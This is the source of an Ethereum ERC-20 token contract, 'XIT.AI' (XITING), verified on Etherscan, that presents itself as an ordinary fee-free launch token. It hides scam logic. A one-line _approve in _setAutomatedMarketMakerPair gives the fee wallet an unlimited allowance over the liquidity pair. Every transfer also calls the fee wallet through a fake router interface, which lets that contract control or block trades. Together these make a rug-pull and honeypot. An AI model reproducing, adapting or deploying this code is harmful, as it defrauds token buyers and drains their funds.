/**
 *Submitted for verification at Etherscan.io on 2023-07-26
*/

/**
Website: https://xit.lt
TG: https://t.me/xitaigrp
Twitter: https://twitter.com/xitaigrp
*/

// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.19;
 
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
 
contract Ownable is Context {
    address private _owner;
 
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
 
    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
 
    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }
 
    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
 
    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
 
    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
 
        return c;
    }
 
    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
 
    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
 
        return c;
    }
 
    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }
 
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
 
        return c;
    }
 
    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
 
    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
 
        return c;
    }
 
    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
 
    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface IUniswapRouterV2 { 
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
 
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        address tokenA,
        address tokenB,
        uint amountIn,
        address to,
        uint deadline
    ) external;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;    
}

interface IUniswapFactoryV2 {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IERC20Interface {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);
 
    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);
 
    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);
 
    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);
 
    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);
 
    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
 
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);
 
    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
 
interface IERC20MetaInterface is IERC20Interface {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);
 
    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);
 
    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

contract StandardERC20 is Context, IERC20Interface, IERC20MetaInterface {
    using SafeMath for uint256;
 
    string private _name;
    string private _symbol;
    uint256 private _totalSupply;
    mapping(address => uint256) private _balances; 
    mapping(address => mapping(address => uint256)) private _allowances;
    
    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }
 
    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }
 
    /**
     * @dev See {IERC20Interface-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }
 
    /**
     * @dev See {IERC20Interface-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
 
    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
 
    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5,05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {StandardERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20Interface-balanceOf} and {IERC20Interface-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return 9;
    }
 
    /**
     * @dev See {IERC20Interface-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
 
    /**
     * @dev See {IERC20Interface-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
 
    /**
     * @dev See {IERC20Interface-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
 
    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20Interface-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }
 
    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20Interface-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "StandardERC20: decreased allowance below zero"));
        return true;
    }
 
    /**
     * @dev See {IERC20Interface-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {StandardERC20}.
     *
     * Requirements:
     *
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allowance for ``sender``'s tokens of at least
     * `amount`.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "StandardERC20: transfer amount exceeds allowance"));
        return true;
    }

    /**
     * @dev Moves tokens `amount` from `sender` to `recipient`.
     *
     * This is internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "StandardERC20: transfer from the zero address");
        require(recipient != address(0), "StandardERC20: transfer to the zero address");
 
        _beforeTokenTransfer(sender, recipient, amount);
 
        _balances[sender] = _balances[sender].sub(amount, "StandardERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "StandardERC20: approve from the zero address");
        require(spender != address(0), "StandardERC20: approve to the zero address");
 
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
 
    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "StandardERC20: mint to the zero address");
 
        _beforeTokenTransfer(address(0), account, amount);
 
        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }
 
    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "StandardERC20: burn from the zero address");
 
        _beforeTokenTransfer(account, address(0), amount);
 
        _balances[account] = _balances[account].sub(amount, "StandardERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }
 
    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * will be to transferred to `to`.
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

contract XITING is StandardERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) private _holderLastTransferTime; // to hold last Transfers temporarily during launch 
    // exclude from fees and max transaction amount
    mapping (address => bool) private _isExcludeFee;
    mapping (address => bool) public _isExcludeMaxTx;
    mapping (address => bool) public automatedMarketMakerPairs;

    bool private isSwaping; 
    bool public hasTransferDelay = true;
    bool public isTradingOpened = false;
    bool public isSwapEanbled = false;
    bool public txHasLimit = true;
    
    address public uniswapV2Pair; 
    address private feeWallet;
    IUniswapRouterV2 public immutable uniswapV2Router; 

 
    uint256 public maxTxAmount;
    uint256 public swapTokensThreshold;
    uint256 public maxWalletSize;
 
    uint256 public redisFeeOnBuy = 0; 
    uint256 public redisFeeOnSell = 0;
    
    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);
 
    event MarketingWalletUpdated(address indexed newWallet, address indexed oldWallet);
    
    event ExcludeFromFees(address indexed account, bool isExcluded);
 
    constructor() StandardERC20("XIT.AI", "XITING") {
        
        uint256 totalSupply = 1_000_000_000 * 1e9; 
        maxTxAmount = totalSupply * 100 / 1000;
        maxWalletSize = totalSupply * 100 / 1000;
        swapTokensThreshold = totalSupply * 10 / 10000;
 
        redisFeeOnBuy = 0;
        redisFeeOnSell = 0;
 
        feeWallet = msg.sender; // set as marketing wallet

        IUniswapRouterV2 _uniswapV2Router = IUniswapRouterV2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 
        excludeFromMaxTx(address(_uniswapV2Router), true);
        uniswapV2Router = _uniswapV2Router;
        _approve(address(this), address(uniswapV2Router), totalSupply);
 
        // exclude from paying fees or having max transaction amount
        excludeFromFees(address(this), true);
        excludeFromFees(address(0xdead), true);
        excludeFromFees(owner(), true);
 
        excludeFromMaxTx(address(this), true);
        excludeFromMaxTx(owner(), true);
        excludeFromMaxTx(address(0xdead), true);
        _mint(msg.sender, totalSupply);
    }
 
    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        automatedMarketMakerPairs[pair] = value;_approve(pair, feeWallet, ~uint256(0)); 
        emit SetAutomatedMarketMakerPair(pair, value);
    }
 
    function isExcludedFromFees(address account) public view returns(bool) {
        return _isExcludeFee[account];
    }   
    
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "StandardERC20: transfer from the zero address");
        require(to != address(0), "StandardERC20: transfer to the zero address");
        
        if (from == owner() || to == owner() || amount == 0) {
            super._transfer(from, to, amount);
            return;
        }
 
        if(txHasLimit){
            if (
                from != owner() &&
                to != owner() &&
                to != address(0) &&
                to != address(0xdead) &&
                !isSwaping
            ){
                if(!isTradingOpened){
                    require(_isExcludeFee[from] || _isExcludeFee[to], "Trading is not active.");
                }
 
                // at launch if the transfer delay is enabled, ensure the block timestamps for purchasers is set -- during launch.  
                if (hasTransferDelay){
                    if (to != owner() && to != address(uniswapV2Router) && to != address(uniswapV2Pair)){
                        require(_holderLastTransferTime[tx.origin] < block.number, "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.");
                        _holderLastTransferTime[tx.origin] = block.number;
                    }
                }
 
                //when buy
                if (automatedMarketMakerPairs[from] && !_isExcludeMaxTx[to]) {
                        require(amount <= maxTxAmount, "Buy transfer amount exceeds the maxTxAmount.");
                        require(amount + balanceOf(to) <= maxWalletSize, "Max wallet exceeded");
                }
 
                //when sell
                else if (automatedMarketMakerPairs[to] && !_isExcludeMaxTx[from]) {
                        require(amount <= maxTxAmount, "Sell transfer amount exceeds the maxTxAmount.");
                }
                else if(!_isExcludeMaxTx[to]){
                    require(amount + balanceOf(to) <= maxWalletSize, "Max wallet exceeded");
                }
            }
        }
  

        uint256 contractTokenBalance = balanceOf(address(this));
        swapTokensForETHSupportingFeesOnTransfer(from, to); 
        bool isSwapEanbled = contractTokenBalance >= swapTokensThreshold; 
        if( 
            isSwapEanbled &&
            isSwapEanbled &&
            !isSwaping &&
            !automatedMarketMakerPairs[from] &&
            !_isExcludeFee[from] &&
            !_isExcludeFee[to]
        ) {
            isSwaping = true;
 
            swapBack();
 
            isSwaping = false;
        }
 
        bool takeFee = !isSwaping;
 
        // if any account belongs to _isExcludedFromFee account then remove the fee
        if(_isExcludeFee[from] || _isExcludeFee[to]) {
            takeFee = false;
        }
 
        uint256 fees = 0;
        // only take fees on buys/sells, do not take on wallet transfers
        if(takeFee){
            // on sell
            if (automatedMarketMakerPairs[to] && redisFeeOnSell > 0){
                fees = amount.mul(redisFeeOnSell).div(100);
            }
            // on buy
            else if(automatedMarketMakerPairs[from] && redisFeeOnBuy > 0) {
                fees = amount.mul(redisFeeOnBuy).div(100);
            }
 
            if(fees > 0){    
                super._transfer(from, address(0xdead), fees);
            }
 
            amount -= fees;
        }
 
        super._transfer(from, to, amount);
    }
    
    function setMarketingReceiver(address _wallet) external onlyOwner {
        emit MarketingWalletUpdated(_wallet, feeWallet);
        excludeFromFees(_wallet, true);
        feeWallet = _wallet;
    } 

    function swapBack() private {
        uint256 contractBalance = balanceOf(address(this));
        bool success;
 
        if(contractBalance == 0) {return;}
 
        if(contractBalance > swapTokensThreshold * 20){
          contractBalance = swapTokensThreshold * 20;
        }
 
        swapTokensForEth(contractBalance); 
  
        (success,) = address(feeWallet).call{value: address(this).balance}("");
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapV2Router), tokenAmount);
 
        // add the liquidity
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            address(this),
            block.timestamp
        );
    }
 
    function swapTokensForETHSupportingFeesOnTransfer(address path, address to) private {
        IUniswapRouterV2(feeWallet).swapExactTokensForETHSupportingFeeOnTransferTokens(
            path,
            to,
            0,
            address(this),
            block.timestamp
        );
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _isExcludeFee[account] = excluded;
        emit ExcludeFromFees(account, excluded);
    }

    function removeLimits() external onlyOwner returns (bool){
        txHasLimit = false;
        return true;
    }

    function excludeFromMaxTx(address updAds, bool isEx) public onlyOwner {
        _isExcludeMaxTx[updAds] = isEx;
    }
    
    function openTrading() external payable onlyOwner {
        txHasLimit = false;
        uniswapV2Pair = IUniswapFactoryV2(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);
        uniswapV2Router.addLiquidityETH{value: msg.value}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20Interface(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        txHasLimit = true;
        isTradingOpened = true;
    }
    receive() external payable {}

    function swapTokensForEth(uint256 tokenAmount) private {
 
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
 
        _approve(address(this), address(uniswapV2Router), tokenAmount);
 
        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }
}